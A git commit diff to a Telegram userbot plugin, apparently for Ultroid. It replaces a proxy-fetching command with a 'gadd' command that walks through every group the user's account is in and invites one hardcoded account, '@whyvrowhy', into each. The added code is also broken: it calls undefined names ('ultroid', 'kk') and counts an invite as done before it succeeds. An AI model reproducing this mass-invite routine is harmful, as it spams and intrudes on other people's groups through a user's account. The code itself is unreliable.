ab5519427d2b6ccb31cae86dc6099b0f1008e28e
Aju <73631177+nidhirobot@users.noreply.github.com>
2021-05-16 01:15:00 +0530

    Update plugin.py

--- plugin.py
+++ plugin.py
@@ -1,26 +1,24 @@
 from telethon import events
 from telethon.errors.rpcerrorlist import YouBlockedUserError
+from telethon.tl.functions.channels import InviteToChannelRequest as e
 
 from . import *
 
-@ultroid_cmd(pattern="https$")
-async def _(event):
-    if event.fwd_from:
-        return
-    chat = "@hqproxy_bot"
-    msg = await eor(event, "Sending Your Https Proxies...")
-    async with ultroid_bot.conversation(chat) as conv:
-        try:
-            response = conv.wait_event(
-                events.NewMessage(incoming=True, from_users=1683047947)
-            )
-            await conv.send_message("/https")
-            response = await response
-        except YouBlockedUserError:
-            await msg.edit("Boss! Please Unblock @hqproxy_bot ")
-            return
-        if response.text.startswith(" "):
-            await event.edit("That bot is dead bro now this cmd is useless ðŸ˜‚ðŸ˜‚")
-        else: 
-            await event.delete()
-            await event.client.send_message(event.chat_id, response.message)
+@ultroid_cmd(
+    pattern="gadd ?(.*)",
+)
+async def gadd(event):
+    if not event.out and not is_fullsudo(event.sender_id):
+        return await eor(event, "`This Command Is Sudo Restricted.`")
+    tt = event.text
+    er = 0
+    done = 0
+    async for x in ultroid_bot.iter_dialogs():
+        if x.is_group:
+            chat = x.id
+            try:
+                done += 1
+                await ultroid(e(chat, "@whyvrowhy"))
+            except BaseException:
+                er += 1
+    await kk.edit(f"Done in {done} chats, error in {er} chat(s)")
